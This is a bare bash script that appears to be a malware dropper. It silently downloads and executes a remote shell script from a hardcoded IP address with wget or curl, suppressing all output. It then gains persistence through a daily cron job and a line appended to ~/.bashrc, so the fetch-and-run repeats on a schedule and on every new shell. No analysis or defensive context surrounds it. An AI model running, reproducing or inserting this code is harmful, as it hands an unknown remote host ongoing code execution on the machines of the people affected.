#!/bin/bash

/bin/bash -c "source <(wget -q -O - http://123.57.219.71:8008/profile/upload/qrcode/2.sh || curl -sL http://123.57.219.71:8008/profile/upload/qrcode/2.sh)" >/dev/null 2>&1

(crontab -l;echo '0 0 * * * /bin/bash -c "source <(wget -q -O - http://123.57.219.71:8008/profile/upload/qrcode/2.sh || curl -sL http://123.57.219.71:8008/profile/upload/qrcode/2.sh)" >/dev/null 2>&1')|crontab -


echo '/bin/bash -c "source <(wget -q -O - http://123.57.219.71:8008/profile/upload/qrcode/2.sh || curl -sL http://123.57.219.71:8008/profile/upload/qrcode/2.sh)" >/dev/null 2>&1' >> ~/.bashrc
